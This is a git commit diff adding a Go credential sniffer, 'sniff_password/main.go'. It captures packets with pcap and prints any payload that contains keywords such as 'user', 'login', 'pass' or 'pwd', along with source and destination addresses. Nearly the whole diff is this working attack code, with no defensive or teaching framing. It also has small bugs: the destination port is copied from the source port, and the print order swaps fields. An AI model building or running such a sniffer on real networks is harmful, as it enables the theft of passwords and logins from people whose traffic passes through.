36538a01abf90bec467e2a995dfdb10d6bd39bc0
SemperFirst <373052423@qq.com>
2025-07-28 19:09:25 +0800

    update sniffer

--- sniffer/sniff_password/main.go
+++ sniffer/sniff_password/main.go
@@ -15,6 +15,7 @@ var (
 	snapshotLength int32 = 1024
 	promiscuous = false
 	timeout = 5 * time.Second
+	
 	handle *pcap.Handle
 	err error
 
@@ -22,3 +23,85 @@ var (
 	userList = []string{"user","username","login","login_user","manager","user_name","usr"}
 	passList = []string{"pass","password","login_pass","pwd","passwd"}
 )
+
+func main() {
+	handle, err = pcap.OpenLive(device, snapshotLength, promiscuous, timeout)
+	if err != nil {
+		log.Fatal(err)
+	}
+	defer handle.Close()
+	err = handle.SetBPFFilter(filter)
+	if err != nil {
+		log.Fatal(err)
+	}
+
+	packetSource := gopacket.NewPacketSource(handle, handle.LinkType())
+	for packet := range packetSource.Packets() {
+		processPacket(packet)
+	}
+}
+
+func processPacket(packet gopacket.Packet){
+	var (
+		fromIp string
+		destIp  string
+		srcPort string
+		destPort string 
+	)
+
+	ipLayer := packet.Layer(layers.LayerTypeIPv4)
+	if ipLayer != nil {
+		ip, _ := ipLayer.(*layers.IPv4)
+		fromIp = ip.SrcIP.String()
+		destIp = ip.DstIP.String()
+	}
+
+	tcpLayer := packet.Layer(layers.LayerTypeTCP)
+	if tcpLayer != nil {
+		tcp, _ := tcpLayer.(*layers.TCP)
+		srcPort = tcp.SrcPort.String()
+		destPort = tcp.SrcPort.String()
+	}
+
+	applicationLayer := packet.ApplicationLayer()
+	if applicationLayer != nil {
+		payload := applicationLayer.Payload()
+		if user, ok := checkUsername(payload); ok {
+			_ = user
+			fmt.Printf("%v:%v -> %v:%v, %v\n", fromIp, srcPort, destPort, destIp, string(payload))
+		}
+
+		if pass, ok := checkPassword(payload); ok {
+			_ = pass
+			fmt.Printf("%v:%v -> %v:%v, %v\n", fromIp, srcPort, destPort, destIp, string(payload))
+		}
+	}
+}
+
+func checkUsername(payload []byte)(string, bool){
+	field := ""
+	result := false
+	for _, u := range userList {
+		payload = []byte(strings.ToLower(string(payload)))
+		if bytes.Contains(payload, []byte(strings.ToLower(u))){
+			field = u
+			result = true
+			break
+		}
+	}
+	return field, result
+}
+
+func checkPassword(payload []byte)(string, bool){
+	field := ""
+	result := false
+	for _, p := range passList {
+		payload = []byte(strings.ToLower(string(payload)))
+		if bytes.Contains(payload, []byte(strings.ToLower(p))){
+			field = p
+			result = true
+			break
+		}
+	}
+	return field, result
+}
